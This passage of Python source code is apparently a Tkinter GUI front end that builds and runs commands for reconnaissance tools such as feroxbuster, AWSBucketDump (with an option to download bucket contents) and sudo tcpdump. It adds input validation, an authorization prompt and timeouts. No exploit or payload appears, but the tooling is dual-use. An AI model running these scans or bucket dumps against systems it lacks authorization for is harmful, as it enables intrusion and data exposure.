                    messagebox.showerror("Error", "Project name too long")
                    return None
                cmd.extend(["-p", project])

            sort = self.githarvester_sort.get()
            if sort:
                cmd.extend(["-o", sort])

            return cmd

        elif tool_id == "feroxbuster":
            url = self.ferox_url.get().strip()
            if not url:
                messagebox.showerror("Error", "Please enter a target URL")
                return None

            if not self.validate_url(url):
                messagebox.showerror("Error", "Invalid URL format")
                return None

            # Validate path BEFORE checking existence
            wordlist = self.ferox_wordlist.get().strip()
            if not wordlist:
                messagebox.showerror("Error", "Please select a wordlist file")
                return None
                
            if not self.validate_file_path(wordlist):
                messagebox.showerror("Error", "Invalid wordlist path")
                return None
            
            if not os.path.isfile(wordlist):
                messagebox.showerror("Error", "Wordlist file not found")
                return None

            cmd = ["feroxbuster", "-u", url, "-w", wordlist]

            extensions = self.ferox_extensions.get().strip()
            # FIX HIGH-5: Validate extensions
            if extensions and not self.validate_file_extensions(extensions):
                return None
            
            if extensions:
                cmd.extend(["-x", extensions])

            # SECURITY FIX (MED-1): Lower thread maximum to prevent resource exhaustion
            threads = self.ferox_threads.get().strip()
            if threads:
                if not self.validate_numeric(threads, 1, 100):  # Reduced from 200
                    messagebox.showerror("Error", "Thread count must be between 1 and 100")
                    return None
                # Warn on high thread count
                if int(threads) > 50:
                    result = messagebox.askyesno("Warning",
                        f"High thread count ({threads}) may cause system slowdown.\nContinue?")
                    if not result:
                        return None
                cmd.extend(["-t", threads])

            depth = self.ferox_depth.get().strip()
            if depth:
                if not self.validate_numeric(depth, 1, 10):
                    messagebox.showerror("Error", "Depth must be between 1 and 10")
                    return None
                cmd.extend(["-d", depth])

            return cmd

        elif tool_id == "awsbucket":
            bucket_list = self.awsbucket_list.get().strip()
            if not bucket_list:
                messagebox.showerror("Error", "Please enter a bucket list file")
                return None

            if not os.path.isfile(bucket_list):
                messagebox.showerror("Error", "Bucket list file not found")
                return None

            if not self.validate_file_path(bucket_list):
                messagebox.showerror("Error", "Invalid bucket list path")
                return None

            # Note: AWSBucketDump needs to be installed separately
            cmd = ["python3", "AWSBucketDump.py", "-l", bucket_list]

            if self.awsbucket_download_var.get():
                cmd.append("-D")

            grep_file = self.awsbucket_grep.get().strip()
            if grep_file and os.path.isfile(grep_file):
                if self.validate_file_path(grep_file):
                    cmd.extend(["-g", grep_file])

            threads = self.awsbucket_threads.get().strip()
            if threads:
                if not self.validate_numeric(threads, 1, 20):
                    messagebox.showerror("Error", "Thread count must be between 1 and 20")
                    return None
                cmd.extend(["-t", threads])

            return cmd

        elif tool_id == "tcpdump":
            interface = self.tcpdump_interface.get().strip()
            if not interface:
                messagebox.showerror("Error", "Please enter a network interface")
                return None
            
            # FIX MED-5: Validate interface name format
            if not self.validate_interface_name(interface):
                messagebox.showerror("Error", "Invalid interface name format")
                return None
            
            # Security: Verify interface exists
            interfaces = self.get_network_interfaces()
            if interface not in interfaces:
                messagebox.showerror("Error", f"Interface '{interface}' not found on system")
                return None

            # SECURITY FIX (MED-3 & HIGH-1): Validate interface exists and strengthen BPF validation
            # Check interface name format
            if not re.match(r'^[a-zA-Z0-9\-]+$', interface):
                messagebox.showerror("Error", "Invalid interface name. Use alphanumeric characters and hyphens only.")
                return None
            
            # Verify interface exists on system
            try:
                net_path = f"/sys/class/net/{interface}"
                if not os.path.exists(net_path):
                    messagebox.showerror("Error",
                        f"Network interface '{interface}' not found.\nCheck 'ip link show' for available interfaces.")
                    return None
            except OSError:
                pass  # If we can't check, proceed anyway

            cmd = ["sudo", "tcpdump", "-i", interface]

            count = self.tcpdump_count.get().strip()
            if count:
                if not self.validate_numeric(count, 1, 10000):
                    messagebox.showerror("Error", "Packet count must be between 1 and 10000")
                    return None
                cmd.extend(["-c", count])

            output_file = self.tcpdump_output.get().strip()
            if output_file:
                # Validate output path
                abs_path = os.path.abspath(output_file)
                home_dir = os.path.expanduser("~")
                if not abs_path.startswith(home_dir):
                    messagebox.showerror("Error", "Output file must be in your home directory")
                    return None
                cmd.extend(["-w", output_file])

            if self.tcpdump_verbose_var.get():
                cmd.append("-v")

            bpf_filter = self.tcpdump_filter.get().strip()
            if bpf_filter:
                # SECURITY FIX (HIGH-1): Strengthen BPF filter validation
                # Whitelist common BPF keywords
                allowed_keywords = [
                    'port', 'host', 'net', 'src', 'dst', 'tcp', 'udp', 'icmp',
                    'ip', 'ip6', 'arp', 'rarp', 'and', 'or', 'not'
                ]
                
                # More restrictive pattern - only allow alphanumeric, spaces, dots, basic operators
                if not re.match(r'^[a-zA-Z0-9\s\.\-]+$', bpf_filter):
                    messagebox.showerror("Security Error",
                        "Invalid BPF filter. Parentheses and special characters not allowed.\n"
                        "Use simple filters: 'port 80', 'host 192.168.1.1', 'tcp and port 443'")
                    return None
                
                # Limit filter length
                if len(bpf_filter) > 100:
                    messagebox.showerror("Error", "BPF filter too long (max 100 characters)")
                    return None
                
                # Validate filter contains at least one known keyword
                filter_lower = bpf_filter.lower()
                has_keyword = any(keyword in filter_lower for keyword in allowed_keywords)
                if not has_keyword:
                    messagebox.showerror("Error",
                        f"BPF filter must contain valid keywords: {', '.join(allowed_keywords[:8])}...")
                    return None
                
                cmd.append(bpf_filter)

            return cmd

        return None

    def run_scan(self):
        # Security: Thread-safe check for running scan
        with self.scan_lock:
            if self.is_running:
                messagebox.showwarning("Warning", "A scan is already running")
                return

        try:
            cmd = self.build_command()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to build command: {str(e)}")
            return
        if not cmd:
            return

        # Confirmation
        confirm = messagebox.askyesno(
            "Confirm Scan",
            f"Execute command:\n{' '.join(cmd)}\n\nEnsure you have authorization to scan this target.\nContinue?"
        )
        if not confirm:
            return

        # Security: Reset stop event for new scan
        self.stop_event.clear()

        with self.scan_lock:
            self.is_running = True

        self.run_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

        self.append_output(f"\n{'='*70}\n")
        self.append_output(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Starting scan...\n")
        self.append_output(f"Command: {' '.join(cmd)}\n")
        self.append_output(f"{'='*70}\n\n")

        self.update_status("SCANNING...", self.accent_red)

        # Add command to history
        self.add_to_history(command=cmd)

        # Add target/URL to history based on tool
        tool_id = self.current_tool
        if tool_id == "nmap":
            target = self.nmap_target.get().strip()
            if target:
                self.add_to_history(target=target)
        elif tool_id == "gobuster":
            url = self.gobuster_url.get().strip()
            if url:
                self.add_to_history(url=url)
        elif tool_id == "nikto":
            target = self.nikto_target.get().strip()
            if target:
                self.add_to_history(url=target if target.startswith('http') else None,
                                   target=target if not target.startswith('http') else None)
        elif tool_id == "sqlmap":
            url = self.sqlmap_url.get().strip()
            if url:
                self.add_to_history(url=url)
        elif tool_id == "metasploit":
            target = self.msf_target.get().strip()
            if target:
                self.add_to_history(target=target)

        thread = threading.Thread(target=self.execute_command, args=(cmd,))
        thread.daemon = True
        thread.start()

    def execute_command(self, cmd):
        try:
            # Security: Create process without shell=True to prevent injection
            # Also set preexec_fn to create new process group for clean termination
            self.current_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1,
                shell=False,  # Security: Never use shell=True
                preexec_fn=os.setsid if os.name != 'nt' else None  # Unix-specific
            )

            # Read output with stop event checking
            for line in self.current_process.stdout:
                if self.stop_event.is_set():
                    break
                self.append_output(line)

            # Security: Wait for process with timeout
            try:
                self.current_process.wait(timeout=self.process_timeout)

                # Only show completion if not stopped
                if not self.stop_event.is_set():
                    self.append_output(f"\n{'='*70}\n")
                    self.append_output(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Scan completed\n")
                    self.append_output(f"{'='*70}\n")
                    self.update_status("SCAN COMPLETE", self.accent_green)

            except subprocess.TimeoutExpired:
                # Security: Kill process if timeout exceeded
                self.append_output(f"\n[TIMEOUT] Scan exceeded maximum time limit ({self.process_timeout} seconds)\n")
                self.append_output("Terminating process...\n")
                self.current_process.kill()
                self.current_process.wait()
                self.update_status("TIMEOUT", self.accent_red)

        except FileNotFoundError:
            self.append_output(f"\n[ERROR] Command not found: {cmd[0]}\n")
            self.append_output(f"Make sure {cmd[0]} is installed and in your PATH\n")
            self.update_status("ERROR", self.accent_red)
        except PermissionError:
            self.append_output(f"\n[ERROR] Permission denied for: {cmd[0]}\n")
            self.append_output("Some scans require root/sudo privileges\n")
            self.update_status("ERROR", self.accent_red)
        except Exception as e:
            self.append_output(f"\n[ERROR] {str(e)}\n")
            self.update_status("ERROR", self.accent_red)
        finally:
            # Security: Thread-safe cleanup
            with self.scan_lock:
                self.is_running = False
            self.run_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.current_process = None

    def stop_scan(self):
        # Security: Thread-safe process termination
        with self.scan_lock:
            if self.current_process and self.is_running:
                # Signal the stop event first
                self.stop_event.set()

                try:
                    # Try graceful termination first
                    self.current_process.terminate()

                    # Give it 2 seconds to terminate gracefully
                    try:
                        self.current_process.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        # Force kill if still running
                        self.current_process.kill()
                        self.current_process.wait()

                    self.append_output(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Scan stopped by user\n")
                    self.update_status("STOPPED", self.accent_red)
                except Exception as e:
                    self.append_output(f"\n[ERROR] Failed to stop process: {str(e)}\n")

                self.is_running = False

        # Update UI state
        self.run_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)


def main():
    root = tk.Tk()
    app = ReconSuperpower(root)
    root.mainloop()


if __name__ == "__main__":
    main()
